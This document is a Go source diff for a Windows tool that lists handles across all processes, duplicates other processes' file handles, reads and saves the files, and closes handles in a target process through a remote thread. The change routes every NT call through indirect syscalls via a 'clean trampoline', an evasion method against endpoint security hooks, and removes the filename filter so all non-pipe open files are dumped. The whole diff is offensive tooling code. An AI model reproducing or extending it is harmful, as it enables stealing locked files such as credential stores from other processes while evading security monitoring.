@@ -5,6 +5,8 @@ import (
 	"strings"
 	"syscall"
 	"unsafe"
+
+	wc "github.com/carved4/go-wincall"
 )
 
 const (
@@ -27,7 +29,6 @@ const (
 	dupHandle      = 0x0040
 	handleClass    = 51
 	typeClass      = 2
-	diskType       = 1
 	normalAttr     = 0x80
 
 	fileStandardInfo = 5
@@ -36,13 +37,13 @@ const (
 )
 
 type Handle struct {
-	Val    syscall.Handle
-	Refs   uintptr
-	Ptrs   uintptr
-	Rights uint32
-	Type   uint32
-	Flags  uint32
-	_      uint32
+	Val             uintptr // no longer syscall.Handle, uintptr suffices
+	HandleCount     uintptr
+	PointerCount    uintptr
+	GrantedAccess   uint32
+	ObjectTypeIndex uint32
+	HandleAttr      uint32
+	Reserved        uint32
 }
 
 type Snapshot struct {
@@ -112,42 +113,31 @@ type FileNameInfo struct {
 
 type ObjectAttributes struct {
 	Length                   uint32
-	RootDirectory            syscall.Handle
+	RootDirectory            uintptr
 	ObjectName               *WideStr
 	Attributes               uint32
 	SecurityDescriptor       uintptr
 	SecurityQualityOfService uintptr
 }
 
-type winAPI struct {
-	queryProcess    *syscall.LazyProc
-	querySystem     *syscall.LazyProc
-	queryObject     *syscall.LazyProc
-	closeHandle     *syscall.LazyProc
-	readFile        *syscall.LazyProc
-	queryFileInfo   *syscall.LazyProc
-	setFileInfo     *syscall.LazyProc
-	duplicateObject *syscall.LazyProc
-	openProcess     *syscall.LazyProc
-	createFile      *syscall.LazyProc
-	writeFile       *syscall.LazyProc
-	createThread    *syscall.LazyProc
-}
-
-var api = &winAPI{
-	queryProcess:    syscall.NewLazyDLL("ntdll.dll").NewProc("NtQueryInformationProcess"),
-	querySystem:     syscall.NewLazyDLL("ntdll.dll").NewProc("NtQuerySystemInformation"),
-	queryObject:     syscall.NewLazyDLL("ntdll.dll").NewProc("NtQueryObject"),
-	closeHandle:     syscall.NewLazyDLL("ntdll.dll").NewProc("NtClose"),
-	readFile:        syscall.NewLazyDLL("ntdll.dll").NewProc("NtReadFile"),
-	queryFileInfo:   syscall.NewLazyDLL("ntdll.dll").NewProc("NtQueryInformationFile"),
-	setFileInfo:     syscall.NewLazyDLL("ntdll.dll").NewProc("NtSetInformationFile"),
-	duplicateObject: syscall.NewLazyDLL("ntdll.dll").NewProc("NtDuplicateObject"),
-	openProcess:     syscall.NewLazyDLL("ntdll.dll").NewProc("NtOpenProcess"),
-	createFile:      syscall.NewLazyDLL("ntdll.dll").NewProc("NtCreateFile"),
-	writeFile:       syscall.NewLazyDLL("ntdll.dll").NewProc("NtWriteFile"),
-	createThread:    syscall.NewLazyDLL("ntdll.dll").NewProc("RtlCreateUserThread"),
-}
+// replaced syscalls and winapi calls with go-wincall
+// all syscalls now go through an asm stub to find a clean trampoline before execution, see https://github.com/carved4/go-wincall/blob/main/pkg/syscall/syscall_windows_amd64.s
+// api is roughly the same, added syscall.SSN, syscall.Address, to arg list for each and casted some vals to uintptr
+var (
+	ntdllBase       = wc.GetModuleBase(wc.GetHash("ntdll.dll"))
+	queryProcess    = wc.GetSyscall(wc.GetHash("NtQueryInformationProcess"))
+	querySystem     = wc.GetSyscall(wc.GetHash("NtQuerySystemInformation"))
+	queryObject     = wc.GetSyscall(wc.GetHash("NtQueryObject"))
+	closeHandle     = wc.GetSyscall(wc.GetHash("NtClose"))
+	readFile        = wc.GetSyscall(wc.GetHash("NtReadFile"))
+	queryFileInfo   = wc.GetSyscall(wc.GetHash("NtQueryInformationFile"))
+	setFileInfo     = wc.GetSyscall(wc.GetHash("NtSetInformationFile"))
+	duplicateObject = wc.GetSyscall(wc.GetHash("NtDuplicateObject"))
+	openProcess     = wc.GetSyscall(wc.GetHash("NtOpenProcess"))
+	createFile      = wc.GetSyscall(wc.GetHash("NtCreateFile"))
+	writeFile       = wc.GetSyscall(wc.GetHash("NtWriteFile"))
+	createThread    = wc.GetFunctionAddress(ntdllBase, wc.GetHash("RtlCreateUserThread"))
+)
 
 func ScanProcesses(target string) (map[uint32][]Handle, error) {
 	procs := make(map[uint32][]Handle)
@@ -158,7 +148,14 @@ func ScanProcesses(target string) (map[uint32][]Handle, error) {
 
 	for code == statusMismatch {
 		mem = make([]byte, bufLen)
-		r, _, _ := api.querySystem.Call(5, uintptr(unsafe.Pointer(&mem[0])), uintptr(bufLen), uintptr(unsafe.Pointer(&bufLen)))
+		r, _ := wc.IndirectSyscall(
+			querySystem.SSN,
+			querySystem.Address,
+			5,
+			uintptr(unsafe.Pointer(&mem[0])),
+			uintptr(bufLen),
+			uintptr(unsafe.Pointer(&bufLen)),
+		)
 		code = uint32(r)
 	}
 
@@ -192,8 +189,10 @@ func ScanProcesses(target string) (map[uint32][]Handle, error) {
 					var objAttr ObjectAttributes
 					objAttr.Length = uint32(unsafe.Sizeof(objAttr))
 
-					var proc syscall.Handle
-					if r, _, _ := api.openProcess.Call(
+					var proc uintptr
+					if r, _ := wc.IndirectSyscall(
+						openProcess.SSN,
+						openProcess.Address,
 						uintptr(unsafe.Pointer(&proc)),
 						uintptr(queryInfo|dupHandle),
 						uintptr(unsafe.Pointer(&objAttr)),
@@ -211,7 +210,14 @@ func ScanProcesses(target string) (map[uint32][]Handle, error) {
 								p = uintptr(unsafe.Pointer(&hMem[0]))
 							}
 
-							r, _, _ := api.queryProcess.Call(uintptr(proc), handleClass, p, uintptr(hBufLen), uintptr(unsafe.Pointer(&hBufLen)))
+							r, _ := wc.IndirectSyscall(
+								queryProcess.SSN,
+								queryProcess.Address,
+								uintptr(proc),
+								handleClass,
+								p, uintptr(hBufLen),
+								uintptr(unsafe.Pointer(&hBufLen)),
+							)
 							hCode = uint32(r)
 						}
 
@@ -229,8 +235,7 @@ func ScanProcesses(target string) (map[uint32][]Handle, error) {
 								procs[pid] = items
 							}
 						}
-
-						api.closeHandle.Call(uintptr(proc))
+						wc.IndirectSyscall(closeHandle.SSN, closeHandle.Address, uintptr(proc))
 					}
 				}
 			}
@@ -245,7 +250,7 @@ func ScanProcesses(target string) (map[uint32][]Handle, error) {
 	return procs, nil
 }
 
-func ExtractFile(hnd syscall.Handle, owner uint32, pattern string) ([]byte, string, error) {
+func ExtractFile(hnd uintptr, owner uint32) ([]byte, string, error) {
 	var clientId struct {
 		pid uintptr
 		tid uintptr
@@ -255,8 +260,10 @@ func ExtractFile(hnd syscall.Handle, owner uint32, pattern string) ([]byte, stri
 	var objAttr ObjectAttributes
 	objAttr.Length = uint32(unsafe.Sizeof(objAttr))
 
-	var proc syscall.Handle
-	if r, _, _ := api.openProcess.Call(
+	var proc uintptr
+	if r, _ := wc.IndirectSyscall(
+		openProcess.SSN,
+		openProcess.Address,
 		uintptr(unsafe.Pointer(&proc)),
 		uintptr(dupHandle),
 		uintptr(unsafe.Pointer(&objAttr)),
@@ -264,16 +271,16 @@ func ExtractFile(hnd syscall.Handle, owner uint32, pattern string) ([]byte, stri
 	); r != statusSuccess {
 		return nil, "", fmt.Errorf("access denied")
 	}
-	defer api.closeHandle.Call(uintptr(proc))
+	defer wc.IndirectSyscall(closeHandle.SSN, closeHandle.Address, uintptr(proc))
 
-	var dup syscall.Handle
+	var dup uintptr
 	self := ^uintptr(0)
 
 	accessRights := fileReadData | fileWriteData | fileAppendData | fileReadEA | fileWriteEA | fileReadAttr | fileWriteAttr | readControl | synchronize
-	if r, _, _ := api.duplicateObject.Call(uintptr(proc), uintptr(hnd), self, uintptr(unsafe.Pointer(&dup)), uintptr(accessRights), 0, 0); r != statusSuccess {
+	if r, _ := wc.IndirectSyscall(duplicateObject.SSN, duplicateObject.Address, uintptr(proc), uintptr(hnd), self, uintptr(unsafe.Pointer(&dup)), uintptr(accessRights), 0, 0); r != statusSuccess {
 		return nil, "", fmt.Errorf("dup error: %x", r)
 	}
-	defer api.closeHandle.Call(uintptr(dup))
+	defer wc.IndirectSyscall(closeHandle.SSN, closeHandle.Address, uintptr(dup))
 
 	var bufLen uint32
 	var mem []byte
@@ -285,8 +292,8 @@ func ExtractFile(hnd syscall.Handle, owner uint32, pattern string) ([]byte, stri
 			mem = make([]byte, bufLen)
 			p = uintptr(unsafe.Pointer(&mem[0]))
 		}
-
-		r, _, _ := api.queryObject.Call(uintptr(dup), typeClass, p, uintptr(bufLen), uintptr(unsafe.Pointer(&bufLen)))
+		// query object
+		r, _ := wc.IndirectSyscall(queryObject.SSN, queryObject.Address, uintptr(dup), typeClass, p, uintptr(bufLen), uintptr(unsafe.Pointer(&bufLen)))
 		code = uint32(r)
 	}
 
@@ -314,7 +321,7 @@ func ExtractFile(hnd syscall.Handle, owner uint32, pattern string) ([]byte, stri
 	nameBuf := make([]byte, nameLen)
 	var iosb IoStatusBlock
 
-	r, _, _ := api.queryFileInfo.Call(uintptr(dup), uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&nameBuf[0])), uintptr(nameLen), fileNameInfo)
+	r, _ := wc.IndirectSyscall(queryFileInfo.SSN, queryFileInfo.Address, uintptr(dup), uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&nameBuf[0])), uintptr(nameLen), fileNameInfo)
 	if r != statusSuccess {
 		return nil, "", fmt.Errorf("path error: %x", r)
 	}
@@ -326,42 +333,31 @@ func ExtractFile(hnd syscall.Handle, owner uint32, pattern string) ([]byte, stri
 		nameBuf16 := (*[32768]uint16)(namePtr)[:nameChars:nameChars]
 		fullpath := syscall.UTF16ToString(nameBuf16)
 
-		sep := strings.LastIndex(fullpath, "\\")
-		if sep == -1 {
-			sep = strings.LastIndex(fullpath, "/")
-		}
-
-		var basename string
-		if sep == -1 {
-			basename = fullpath
-		} else {
-			basename = fullpath[sep+1:]
-		}
-
-		if !strings.EqualFold(basename, pattern) {
-			return nil, "", fmt.Errorf("no match: got %s, want %s", basename, pattern)
+		// skip named pipes bc they block forever on read
+		if strings.HasPrefix(fullpath, "\\LOCAL\\") || strings.HasPrefix(fullpath, "\\Device\\NamedPipe") || strings.Contains(fullpath, "\\Device\\") {
+			return nil, "", fmt.Errorf("skipped pipe")
 		}
 
 		var stdInfo FileStandardInfo
 		iosb = IoStatusBlock{}
 
-		if r, _, _ := api.queryFileInfo.Call(uintptr(dup), uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&stdInfo)), unsafe.Sizeof(stdInfo), fileStandardInfo); r != statusSuccess {
+		if r, _ := wc.IndirectSyscall(queryFileInfo.SSN, queryFileInfo.Address, uintptr(dup), uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&stdInfo)), unsafe.Sizeof(stdInfo), fileStandardInfo); r != statusSuccess {
 			return nil, fullpath, fmt.Errorf("size error: %x", r)
 		}
 
 		fsz := stdInfo.EndOfFile
-		if fsz == 0 {
-			return []byte{}, fullpath, nil
+		if fsz <= 0 {
+			return nil, "", fmt.Errorf("empty file")
 		}
 
 		var posInfo FilePositionInfo
 		posInfo.CurrentByteOffset = 0
-		api.setFileInfo.Call(uintptr(dup), uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&posInfo)), unsafe.Sizeof(posInfo), filePositionInfo)
+		wc.IndirectSyscall(setFileInfo.SSN, setFileInfo.Address, uintptr(dup), uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&posInfo)), unsafe.Sizeof(posInfo), filePositionInfo)
 
 		content := make([]byte, fsz)
 		iosb = IoStatusBlock{}
 
-		if r, _, _ := api.readFile.Call(uintptr(dup), 0, 0, 0, uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&content[0])), uintptr(fsz), 0, 0); r != statusSuccess {
+		if r, _ := wc.IndirectSyscall(readFile.SSN, readFile.Address, uintptr(dup), 0, 0, 0, uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&content[0])), uintptr(fsz), 0, 0); r != statusSuccess {
 			return nil, fullpath, fmt.Errorf("read error: %x", r)
 		}
 
@@ -376,9 +372,9 @@ func SaveFile(content []byte, dest string) error {
 	if len(dest) >= 2 && dest[1] == ':' {
 		abspath = dest
 	} else {
-		rtlGetCurDir := syscall.NewLazyDLL("ntdll.dll").NewProc("RtlGetCurrentDirectory_U")
+		rtlGetCurDir := wc.GetFunctionAddress(ntdllBase, wc.GetHash("RtlGetCurrentDirectory_U"))
 		cwd := make([]uint16, 260)
-		n, _, _ := rtlGetCurDir.Call(uintptr(len(cwd)*2), uintptr(unsafe.Pointer(&cwd[0])))
+		n, _, _ := wc.CallG0(rtlGetCurDir, uintptr(len(cwd)*2), uintptr(unsafe.Pointer(&cwd[0])))
 		if n == 0 {
 			return fmt.Errorf("failed to get current directory")
 		}
@@ -404,9 +400,11 @@ func SaveFile(content []byte, dest string) error {
 	objAttr.Attributes = 0x40
 
 	var iosb IoStatusBlock
-	var h syscall.Handle
+	var h uintptr
 
-	r, _, _ := api.createFile.Call(
+	r, _ := wc.IndirectSyscall(
+		createFile.SSN,
+		createFile.Address,
 		uintptr(unsafe.Pointer(&h)),
 		uintptr(fileWriteData|fileAppendData|synchronize),
 		uintptr(unsafe.Pointer(&objAttr)),
@@ -423,11 +421,13 @@ func SaveFile(content []byte, dest string) error {
 	if r != statusSuccess {
 		return fmt.Errorf("failed to create file: %x", r)
 	}
-	defer api.closeHandle.Call(uintptr(h))
+	defer wc.IndirectSyscall(closeHandle.SSN, closeHandle.Address, uintptr(h))
 
 	iosb = IoStatusBlock{}
 
-	r, _, _ = api.writeFile.Call(
+	r, _ = wc.IndirectSyscall(
+		writeFile.SSN,
+		writeFile.Address,
 		uintptr(h),
 		0,
 		0,
@@ -446,7 +446,7 @@ func SaveFile(content []byte, dest string) error {
 	return nil
 }
 
-func KillHandle(owner uint32, hnd syscall.Handle) error {
+func KillHandle(owner uint32, hnd uintptr) error {
 	var clientId struct {
 		pid uintptr
 		tid uintptr
@@ -456,9 +456,12 @@ func KillHandle(owner uint32, hnd syscall.Handle) error {
 	var objAttr ObjectAttributes
 	objAttr.Length = uint32(unsafe.Sizeof(objAttr))
 
-	var proc syscall.Handle
+	var proc uintptr
 	processCreateThread := uint32(0x0002)
-	if r, _, _ := api.openProcess.Call(
+
+	if r, _ := wc.IndirectSyscall(
+		openProcess.SSN,
+		openProcess.Address,
 		uintptr(unsafe.Pointer(&proc)),
 		uintptr(dupHandle|processVmOp|processVmRead|processVmWrite|processCreateThread),
 		uintptr(unsafe.Pointer(&objAttr)),
@@ -466,12 +469,13 @@ func KillHandle(owner uint32, hnd syscall.Handle) error {
 	); r != statusSuccess {
 		return fmt.Errorf("failed to open process: %x", r)
 	}
-	defer api.closeHandle.Call(uintptr(proc))
+	defer wc.IndirectSyscall(closeHandle.SSN, closeHandle.Address, uintptr(proc))
 
-	fn := api.closeHandle.Addr()
-	var thd syscall.Handle
+	fn := closeHandle.Address
+	var thd uintptr
 
-	r, _, _ := api.createThread.Call(
+	r, _, _ := wc.CallG0(
+		createThread,
 		uintptr(proc),
 		0,
 		0,
@@ -487,7 +491,6 @@ func KillHandle(owner uint32, hnd syscall.Handle) error {
 	if r != statusSuccess {
 		return fmt.Errorf("failed to create remote thread: %x", r)
 	}
-
-	api.closeHandle.Call(uintptr(thd))
+	wc.IndirectSyscall(closeHandle.SSN, closeHandle.Address, uintptr(thd))
 	return nil
 }
